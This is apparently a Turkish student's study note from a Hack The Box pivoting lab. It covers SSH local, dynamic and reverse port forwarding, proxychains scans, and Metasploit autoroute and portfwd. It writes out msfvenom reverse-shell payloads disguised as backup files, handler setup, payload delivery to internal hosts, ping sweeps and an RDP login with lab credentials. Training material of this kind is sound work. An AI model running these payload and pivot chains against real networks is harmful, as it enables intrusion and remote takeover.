
# Port Forwarding, Pivoting, Tunneling
**Lateral Movement (Yanal Hareket):** Aynı ağ segmenti içinde ele geçirilen bir hesabı kullanarak diğer makinelere yayılmaktır. *Örnek:* Bir Windows makinesinde yerel yönetici parolasının hash'ini bulup aynı parolayı kullanan diğer Windows sunucularına giriş yapmak.

**Pivoting:** Ele geçirdiğin bir host'u köprü olarak kullanıp doğrudan erişemediğin bir ağa geçmektir. *Örnek:* Hem `10.129.x.x` hem `172.16.5.0/23` ağına bağlı Ubuntu pivot host'unu kullanarak, Attack Host'tan `172.16.5.19` Windows sunucusuna ulaşmak.

**Tunneling (Tünelleme):** Trafiği başka bir protokolün içine gömerek taşımaktır. Güvenlik duvarları genelde izin verilen protokolü geçirir. *Örnek:* C2 trafiğini HTTP GET/POST istekleri gibi göstererek kurumsal ağdaki denetimleri atlatmak.

**Kısaca fark:** Lateral movement aynı ağda yayılmak, pivoting farklı bir ağa geçmek için cihazı köprü yapmak, tunneling ise bu bağlantının trafiğini kapsüllemek. Pivoting çoğu zaman tunneling kullanır ama tünel olmadan da pivot yapılabilir; port forwarding ve proxychains bunun basit örnekleridir.

----

# Port Forwarding

## SSH Local Port Forwarding

![ssh-port-porwarding](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/11.png)

#### Scanning the Pivot Target

```bash
nmap -sT -p22,3306 10.129.202.64

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql
```

#### Target Makinadan Kendi Makinamıza Port Gönderme (Localde Port Forwarding)

> **🚨 Dikkat:** Bu işlemi yapabilmek için öncelikle target'ın username ve passwordunu bilmemiz gerekiyor.


> **🚨 Dikkat:** Bu işlemi kendi makinamızda yapıcaz.

```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

# ssh -L my-ip'de-çalışıcak-port:o-makinadan-kendi-makinama-yönlendirme-yapıyroum-ama-buraya-yinede-localhost-yazıcaz:o-makinadaki-3306-portunu-gönderiyorum shell-aldığım-target-makina-username@shell-aldığım-targetmakina-ip-adresi
```

##### Başarılımı değilmi kontrol etme
**netstat**

```bash
netstat -antp | grep 1234

tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
```

**nmap**

```bash
nmap -v -sV -p1234 localhost

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

#### Target Makinadan Kendi Makinamıza Multiple Port Gönderme (Localde Port Forwarding)

```bash
ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64

# 1234 ve 8080 benim makinamda çalışcıak port  
```

## Dynamic Port Forwarding

> **🚨 Dikkat:** Bu işlemi yapabilmek için öncelikle target'ın username ve passwordunu bilmemiz gerekiyor.

Ubuntu (`target-makina`) ana bilgisayarında `ifconfig` komutunu yazarsanız, bu sunucunun birden fazla ağ arabirim kartına (NIC) sahip olduğunu göreceksiniz:

- Saldırı ana bilgisayarımıza **bize** (`ens192`) bağlı olan
- Farklı bir ağ (`ens224`) içindeki diğer ana bilgisayarlarla iletişim kuran bir birim
- Geri döngü arayüzü `lo`.
  - Makinenin kendi kendisiyle konuşmasını sağlayan sanal ağ arayüzüdür (yani `localhost` veya `127.0.0.1` adresidir).

```bash

# ubuntu@WEB01:~$ 

ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0  overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0  overruns 0  frame 0
        TX errors 0  dropped 0  carrier 0  collisions 0
```

Hangi porta erişmemiz gerektiğini bildiğimiz önceki senaryonun aksine, **mevcut senaryomuzda ağın diğer tarafında hangi hizmetlerin bulunduğunu bilmiyoruz.**

Bu nedenle, ağ üzerindeki daha küçük IP aralıklarını (`172.16.5.1-200`) veya tüm alt ağı (`172.16.5.0/23`) tarayabiliriz. Bu taramayı doğrudan saldırı makinemizden gerçekleştiremeyiz;

çünkü makinemizin `172.16.5.0/23` ağına giden herhangi bir rotası bulunmamaktadır. Bunu yapabilmek için dinamik port yönlendirme (`dynamic port forwarding`) yöntemini kullanmalı ve ağ paketlerimizi Ubuntu sunucusu üzerinden yönlendirmeliyiz (`pivot` etmeliyiz).

Bunu gerçekleştirmek adına, yerel makinemizde (kişisel saldırı makinemiz) bir SOCKS dinleyicisi (listener) başlatırız.
Ardından hedef sunucuya bağlandıktan sonra, trafiği `SSH` tüneli üzerinden söz konusu ağa (`172.16.5.0/23`) yönlendirecek şekilde `SSH` yapılandırmasını ayarlayabiliriz.

![ssh-port-porwarding](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/22.png)

Yukarıdaki görselde, saldırgan ana bilgisayar **SSH** istemcisini başlatır ve **SSH** sunucusundan, **SSH** soketi üzerinden TCP verisi göndermesine izin vermesini talep eder. **SSH** sunucusu bir onay yanıtı döner; ardından **SSH** istemcisi localhost:9050 adresinde dinlemeye başlar. Buraya gönderdiğiniz her türlü veri, **SSH** üzerinden tüm ağa (`172.16.5.0/23`) yayınlanır. Bu dinamik port yönlendirme işlemini gerçekleştirmek için aşağıdaki komutu kullanabiliriz.



## Enabling Dynamic Port Forwarding with SSH

**Mantığı Tam olarak;** A (sen) B'ye SSH ile bağlanıp tüneli kuruyorsun sonra trafiğin B üzerinden geçerek arkadaki C'ye (iç ağdaki hedefe) ulaşıyor.

> **🚨 Dikkat:** Bu işlemi kendi makinamızda yapıcaz.

```bash

# suslu7616@htb[/htb]$

ssh -D 9050 ubuntu@10.129.202.64
# 9050 benim sunucumda çalışıcak port 
# ubuntu@10.129.202.64 ise target makina Yani B makinası

```

> **🚨 Dikkat:** Burada C Makinasındaki çıkan istekleri B üzerinden A'ya Aktarıyoruz ve o istekleride `proxychains` ile kendi `burp-suit` aracımıza aktarıyoruz.
> **🚨 Dikkat:** Bu işlemi proxychains kullanmak şart


Proxychains'e `9050` numaralı portu kullanmamız gerektiğini bildirmek için, **/etc/proxychains4.conf** konumunda bulunan proxychains yapılandırma dosyasını değiştirmemiz gerekir. Eğer halihazırda mevcut değilse, dosyanın son satırına `socks4 127.0.0.1 9050` ifadesini ekleyebiliriz **Ayrıca Burp-Üzerindende 9050 dinlememiz gerekiyor**.

**Checking /etc/proxychains4.conf**

```bash

# suslu7616@htb[/htb]$

tail -4 /etc/proxychains4.conf

# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050
```

### proxychains ile nmap kullanma kendi makinamızdan

**-sn** sadece ping atar

```bash

# suslu7616@htb[/htb]$

proxychains nmap -v -sn 172.16.5.1-200




Scanning 172.16.5.19 [1000 ports]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
Discovered open port 445/tcp on 172.16.5.19
# 172.16.5.1-200 C makinasının Ağını tarar
```

### proxychains ile Metasploit kullanma kendi makinamızdan

```bash

# suslu7616@htb[/htb]$

proxychains msfconsole



msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
rhosts => 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK

[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**burada rdp buldu xfreerdp kullanılarak bağlanıcaz. username:`victor`, parola:`pass@123`'tür.

###  Proxychains ile  xfreerdp kullanma


> **⚠️ Dikkat:** Burada 172.16.5.19 'B' makinası yani ortadaki makina 


```bash

# suslu7616@htb[/htb]$

proxychains xfreerdp3 /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore +clipboard
```
## Remote/Reverse Port Forwarding with SSH


![Reverse Port Forwarding](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/158/33.png)



### Creating a Windows Payload with msfvenom


> **🚨 Çok Dikkat:** **LHOST ve LPORT B Makinasının içindeki windowsa erişim sağladığımız ağ ip-adresi `ifconfig içindeki 2. ip adres`**

```bash

# suslu7616@htb[/htb]$

msfvenom -p windows/x64/meterpreter/reverse_https lhost= <B-Makinası-Pivot-Host-içindeki-windowsun-bağlı-oldugu-ağ> -f exe -o backupscript.exe LPORT=8080
```
### sonra bu kısmı dinlemeye alıcaz


```bash

# suslu7616@htb[/htb]$

msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```


### payloadı pivot hosta Yani B'ye atıyor

```bash
# suslu7616@htb[/htb]$
scp backupscript.exe <B-Makinası-username>@<B-Makinası-target-ip>:~/

```
### B Makinasında Python ile server açıyourz

```bash
# ubuntu@Webserver$ 
python3 -m http.server 8123

```

### B Makinasından C makinasına B makinasında açtığımız sunucudan çekiyoruz

> **🚨 Dikkat:** buradaki urlin adresine B Malinasında ifconfig Çalıştır ve orada çıkan windows ip adresini yaz Yani C-Makinasının-ip-adresi


```powershell

PS C:\Windows\system32> Invoke-WebRequest -Uri "http://B-Makinasında-görünen-windows-yada-c-IP:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### şimdi remote port fowarding yapıyoruz

```bash
# suslu7616@htb[/htb]$ 
ssh -R <B-Makinasının-ip-adresi>:8080:0.0.0.0:8000 <B-Makinasının-username>@<B-Makinasının-ip-adresi>
```

Yani `-vN` diyerek: "Bana bağlantı detaylarını göster ama sakın bana bir komut satırı açma, sadece tüneli arka planda çalıştırıp beklet" demiş olursun.

---

##  SSH port yönlendirmeye (port forwarding) ihtiyaç duymadan, Meterpreter ile port forwarding


**Makineler:**
*   **A Makinesi:** Senin saldırgan makinen (Kali vb. - IP: 10.129.xx.xx)
*   **B Makinesi:** Ele geçirdiğin Pivot (Ubuntu - İç IP: 172.16.5.129)
*   **C Makinesi:** İç ağdaki hedef (Windows - IP: 172.16.5.19 vb.)

İşte resimdeki adımlar:

**1. Adım: Payload Hazırlığı (A Makinesinde)**
B makinesini (Ubuntu'yu) ele geçirmek için A'da `msfvenom` ile bir Linux zararlısı (payload) oluşturuyorsun. (Hedef: B'nin dış IP'si, Port: 8080).

```bash
# suslu7616@htb[/htb]$ 

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=A-Makınası-ip -f elf -o backupjob LPORT=A-Makınası-Port
```

**2. Adım: Dinleyiciyi Başlatma (A Makinesinde)**
A'da Metasploit'i açıp `multi/handler` modülünü çalıştırıyorsun. (Kendi IP'ni ve 8080 portunu dinliyorsun).

`buradaki 0.0.0.0 aslında bizim A makinamızın ip'si`

```bash
# suslu7616@htb[/htb]$ 
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080
```



**3. Adım: İlk Sızma ve B Makinesini Ele Geçirme**
Oluşturduğun payload'ı B makinesine atıp çalıştırıyorsun. B makinesi sana (A'ya) bağlanıyor ve **Meterpreter** oturumunu alıyorsun. Artık B'nin içindesin.

```bash
# ubuntu@WebServer:~$

ls

backupjob
chmod +x backupjob 
 ./backupjob
```

**Meterpreter Session Establishment**

```bash
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

**4. Adım: Ağ Keşfi (B Makinesinde)**
Meterpreter'da `ipconfig` yazıyorsun. B makinesinin iç ağ IP'sini (`172.16.5.129`) ve C'nin bulunduğu ağı (`172.16.5.0/23`) görüyorsun. 

**Linux İçin**
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

**Windows İçin**
```bash
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

**Powershell İçin**
```bash
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```


**5. Adım: SOCKS Proxy Başlatma (A Makinesinde)**
Meterpreter içindeyken `use auxiliary/server/socks_proxy` diyerek A makinesinde 9050 portunu açıyorsun. (Bu, A'dan çıkan trafiğin B üzerinden C'ye gitmesini sağlayacak).

```bash
meterpreter > bg

msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

**Proxy serverin çalıştıgını doğrula**

```bash
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

**6. Adım: Proxychains Ayarlama (A Makinesinde)**
A makinesindeki `/etc/proxychains4.conf` dosyasını açıp en alt satıra `socks5 127.0.0.1 9050` yazıyorsun. (A'daki araçların bu tüneli kullanmasını sağlıyorsun).

```bash
nano /etc/proxychains4.conf

socks4  127.0.0.1 9050
```

**route oluştur `AutoRoute` ile**

```bash
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

**7. Adım: Autoroute Ekleme (A Makinesinde)**
Meterpreter içinde `run autoroute -s 172.16.5.0/23` komutunu giriyorsun. Bu, A makinesine *"172.16.5.x ağına gideceksen yolu B makinesinden geçir"* diyor.

```bash
sessions -l 

sessions -i session-id

#

meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

**Listing Active Routes with AutoRoute**

```bash
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

**Testing Proxy & Routing Functionality (A Makinası Farklı Terminalde)**

```bash
# proxychains nmap C-Makinası -p C-Makinası -sT -v -Pn
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```


**8. Adım: Port Yönlendirme - Local (A Makinesinde)**
C makinesinin 3389 (RDP) portuna A'dan bağlanmak istiyorsun ama doğrudan göremiyorsun. Meterpreter'da `portfwd add -l 3300 -p 3389 -r 172.16.5.19` yazıyorsun. 
*(A makinesinin 3300 portuna gelen her şey, B üzerinden C'nin 3389 portuna gidiyor).* Artık A'dan `127.0.0.1:3300`'e bağlanabilirsin.

**`help portfwd`** ile optionsu görebiliriz

```bash

portfwd add -l 3300 -p 3389 -r 172.16.5.19
# portfwd add -l A-makinesi-portu -p C-makinesinin-portu -r C-makinesinin-IP

```

**9. Adım: Connecting to Windows Target through localhost (A Makinesinde)**

```bash
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

**Netstat Output**

```bash
netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
```



**10. Adım: Port Yönlendirme - Reverse (A Makinesinde)**
Eğer C makinesinden (Windows) sana (A'ya) doğrudan bir shell gelmesini istiyorsan (çünkü firewall A'ya doğrudan bağlanmasına izin vermiyor), bu sefer ters yönlü bir tünel açıyorsun. Meterpreter'da `portfwd add -R -l 8081 -p 1234 -L 10.129.xx.xx` (senin A IP'n) diyorsun. 
*(C'den B'nin 8081 portuna gelen istek, senin A makinenin 1234 portuna düşecek).* Sonra payload'ı C'ye atıp çalıştırıyorsun ve shell A'ya düşüyor.


**Configuring & Starting multi/handler**

```bash
    shellsession
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081
```

**11. Adım: Generating the Windows Payload (A Makinasında)**

**Lhost=B-Makinesinin-ip Lport=B-Makinesinin-Port adresi ve porttubu yazıcaz**

> **🚨 Çok Dikkat:** **LHOST ve LPORT B Makinasının içindeki windowsa erişim sağladığımız ağ ip-adresi `ifconfig içindeki 2. ip adres`**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```